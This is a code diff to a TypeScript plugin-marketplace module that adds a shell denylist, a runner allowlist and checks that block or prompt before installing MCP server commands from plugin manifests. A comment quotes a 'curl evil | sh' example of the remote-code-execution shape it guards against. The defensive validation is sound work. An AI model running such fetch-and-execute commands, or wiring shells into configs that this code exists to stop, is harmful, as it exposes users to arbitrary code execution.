@@ -159,6 +159,210 @@ export function safeResolveInsidePlugin(
   return resolved;
 }
 
+// ── Server command allow/deny list ──────────────────────────────
+
+/**
+ * Allowlist of well-known package-runner / interpreter executables that are
+ * safe to copy verbatim from a plugin manifest into the user's config.
+ *
+ * Anything on this list runs without a trust prompt. Anything not on the
+ * denylist but also not on this list is "unknown" — accepted but considered
+ * non-recommended (custom binary). Anything on the denylist is rejected
+ * unless the caller explicitly opts in via `trustCommands: true`.
+ */
+export const SERVER_COMMAND_ALLOWLIST: ReadonlySet<string> = new Set([
+  "npx",
+  "uvx",
+  "bunx",
+  "node",
+  "bun",
+  "deno",
+  "python",
+  "python3",
+  "pipx",
+  "pnpm",
+  "yarn",
+]);
+
+/**
+ * Denylist of shells / shell-equivalents. A plugin manifest that wires its
+ * MCP `command` to one of these is almost always trying to smuggle arbitrary
+ * shell into the user's config (the canonical RCE shape is
+ * `{command: "sh", args: ["-c", "curl evil | sh"]}`).
+ *
+ * NOTE: `cmd` (without `.exe`) is intentionally NOT denylisted: it is too
+ * commonly used as a literal placeholder in plugin tests and by users as
+ * a synonym for "command". The real Windows shell ships as `cmd.exe`,
+ * which IS denylisted; the case-insensitive comparison covers `CMD.EXE`.
+ */
+export const SERVER_COMMAND_DENYLIST: ReadonlySet<string> = new Set([
+  "sh",
+  "bash",
+  "zsh",
+  "dash",
+  "ksh",
+  "fish",
+  "csh",
+  "tcsh",
+  "ash",
+  "pwsh",
+  "powershell",
+  "powershell.exe",
+  "cmd.exe",
+]);
+
+/** Argv flags that indicate the command is being asked to interpret a shell string. */
+const SHELL_INVOKING_ARGS: ReadonlySet<string> = new Set([
+  "-c",
+  "--command",
+  "/c",
+  "/C",
+  "-Command",
+  "-EncodedCommand",
+]);
+
+export interface ValidateServerCommandOptions {
+  /** Caller has already obtained explicit user trust — skip denylist enforcement. */
+  trustCommands?: boolean;
+  /** Suppress the interactive prompt path (used by --yes / non-interactive callers). */
+  yes?: boolean;
+}
+
+export type ServerCommandClassification = "allowed" | "unknown" | "denied";
+
+export interface ServerCommandValidationResult {
+  classification: ServerCommandClassification;
+  /** Human-readable reason; populated for "unknown" and "denied". */
+  reason?: string;
+}
+
+/**
+ * Classify a single server command + argv pair without throwing.
+ *
+ * Rules:
+ *   - command on the allowlist & no shell-invoking arg  → "allowed"
+ *   - command on the denylist                            → "denied"
+ *   - command contains a path separator (/, \)         → "denied"
+ *     (a manifest pointing at /bin/bash or C:\\Windows\\...\\cmd.exe is
+ *      *always* untrusted: the user has not opted in to a specific binary
+ *      path, the plugin author has chosen one for them).
+ *   - any argv contains a shell-invoking flag (-c, --command, /c)
+ *                                                        → "denied"
+ *   - empty / non-string command                         → "denied"
+ *   - everything else (custom binary names like "my-mcp-server")
+ *                                                        → "unknown"
+ */
+export function classifyServerCommand(
+  command: string,
+  args?: readonly string[],
+): ServerCommandValidationResult {
+  if (typeof command !== "string" || command.length === 0) {
+    return { classification: "denied", reason: "command must be a non-empty string" };
+  }
+  if (command.includes("\0")) {
+    return { classification: "denied", reason: "command contains a NUL byte" };
+  }
+
+  // Path-bearing commands are denied: a manifest should reference a
+  // logical binary name on PATH (npx, node, ...), not a hard-coded
+  // /bin/sh or C:\Windows\System32\cmd.exe.
+  if (command.includes("/") || command.includes("\\")) {
+    return {
+      classification: "denied",
+      reason: `command "${command}" includes a path separator; plugin manifests must reference logical executables on PATH`,
+    };
+  }
+
+  // Normalise for case-insensitive Windows comparison (cmd.exe vs CMD.EXE).
+  const normalised = command.toLowerCase();
+
+  if (SERVER_COMMAND_DENYLIST.has(normalised)) {
+    return {
+      classification: "denied",
+      reason: `command "${command}" is a shell or shell-equivalent and cannot be installed without --trust-commands`,
+    };
+  }
+
+  if (args && args.length > 0) {
+    for (const arg of args) {
+      if (typeof arg !== "string") continue;
+      if (SHELL_INVOKING_ARGS.has(arg)) {
+        return {
+          classification: "denied",
+          reason: `command argv contains shell-invoking flag "${arg}" (treated as arbitrary code execution)`,
+        };
+      }
+    }
+  }
+
+  if (SERVER_COMMAND_ALLOWLIST.has(normalised)) {
+    return { classification: "allowed" };
+  }
+
+  return {
+    classification: "unknown",
+    reason: `command "${command}" is not on the marketplace allowlist (${Array.from(SERVER_COMMAND_ALLOWLIST).join(", ")})`,
+  };
+}
+
+/**
+ * Throwing variant of {@link classifyServerCommand} suitable for call sites
+ * that mutate config. Behaviour:
+ *
+ *   - "allowed"  → silent return.
+ *   - "unknown"  → silent return (custom binary on PATH; we surface this
+ *                  via the install summary rather than blocking).
+ *   - "denied"   → throw MarketplaceSecurityError UNLESS
+ *                  opts.trustCommands === true, in which case allow.
+ *
+ * Interactive trust prompting deliberately lives in the *caller* (the CLI
+ * command layer) so that pure programmatic callers — and the test suite —
+ * never block on stdin. The library layer only enforces.
+ */
+export function assertServerCommandSafe(
+  command: string,
+  args: readonly string[] | undefined,
+  fieldLabel: string,
+  opts: ValidateServerCommandOptions = {},
+): ServerCommandClassification {
+  const result = classifyServerCommand(command, args);
+  if (result.classification === "denied" && !opts.trustCommands) {
+    const argvRendered =
+      args && args.length > 0 ? ` ${args.map((a) => JSON.stringify(a)).join(" ")}` : "";
+    throw new MarketplaceSecurityError(
+      `Refusing to install ${fieldLabel}: ${result.reason ?? "command rejected"}.\n  Full invocation: ${command}${argvRendered}\n  Pass --trust-commands (or trustCommands: true) to install anyway after auditing the plugin source.`,
+    );
+  }
+  return result.classification;
+}
+
+/**
+ * Interactive trust-prompt for a denied command. Returns true if the user
+ * accepted, false otherwise (including non-TTY / cancelled prompt). Caller
+ * decides whether to retry the install with `trustCommands: true` based on
+ * the answer.
+ */
+export async function promptTrustServerCommand(
+  pluginName: string,
+  serverName: string,
+  command: string,
+  args: readonly string[] | undefined,
+  opts: { yes?: boolean } = {},
+): Promise<boolean> {
+  if (opts.yes) return true;
+  const tty = process.stdin.isTTY && process.stdout.isTTY;
+  if (!tty) return false;
+
+  const argvRendered =
+    args && args.length > 0 ? ` ${args.map((a) => JSON.stringify(a)).join(" ")}` : "";
+  const answer = await clack.confirm({
+    message: `Plugin "${pluginName}" wants to install MCP server "${serverName}" with the command:\n  ${command}${argvRendered}\nThis is NOT on the marketplace allowlist and looks like it could execute arbitrary shell. Trust this command?`,
+    initialValue: false,
+  });
+  if (clack.isCancel(answer)) return false;
+  return answer === true;
+}
+
 // ── Clone size / timeout ─────────────────────────────────────────
 
 /**
